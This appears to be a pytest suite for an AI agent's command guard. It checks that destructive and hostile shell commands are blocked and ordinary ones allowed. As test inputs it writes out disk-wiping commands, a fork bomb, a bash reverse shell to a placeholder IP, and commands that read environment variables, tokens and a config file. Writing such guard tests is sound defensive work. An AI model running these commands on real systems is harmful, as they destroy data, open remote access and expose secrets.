"""Tests for dangerous command blocking."""

import pytest

from velo.agent.security.command_guard import check_command


class TestCommandGuard:
    """Test catastrophic command blocking."""

    def test_blocks_rm_rf_root(self):
        result = check_command("rm -rf /")
        assert result is not None
        assert result["error"] == "command_blocked"

    def test_blocks_rm_rf_home(self):
        result = check_command("rm -rf ~")
        assert result is not None

    def test_blocks_mkfs(self):
        result = check_command("mkfs.ext4 /dev/sda1")
        assert result is not None

    def test_blocks_dd_to_disk(self):
        result = check_command("dd if=/dev/zero of=/dev/sda")
        assert result is not None

    def test_blocks_reverse_shell(self):
        result = check_command("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
        assert result is not None

    def test_blocks_fork_bomb(self):
        result = check_command(":(){ :|:& };:")
        assert result is not None

    def test_blocks_sudo(self):
        result = check_command("sudo apt-get install foo")
        assert result is not None

    def test_blocks_cat_proc_environ(self):
        result = check_command("cat /proc/self/environ")
        assert result is not None

    def test_blocks_cat_config_json(self):
        result = check_command("cat ~/.velo/config.json")
        assert result is not None

    def test_allows_normal_commands(self):
        assert check_command("ls -la") is None
        assert check_command("git status") is None
        assert check_command("python script.py") is None
        assert check_command("cat README.md") is None

    def test_allows_rm_in_echo(self):
        """Context classification: rm -rf in echo is not dangerous."""
        assert check_command('echo "rm -rf /"') is None

    def test_allows_rm_in_single_quotes(self):
        assert check_command("echo 'rm -rf /'") is None

    def test_allows_rm_in_heredoc(self):
        assert check_command("cat << 'EOF'\nrm -rf /\nEOF") is None

    def test_blocks_printenv(self):
        result = check_command("printenv")
        assert result is not None

    def test_blocks_env_grep(self):
        result = check_command("env | grep TOKEN")
        assert result is not None
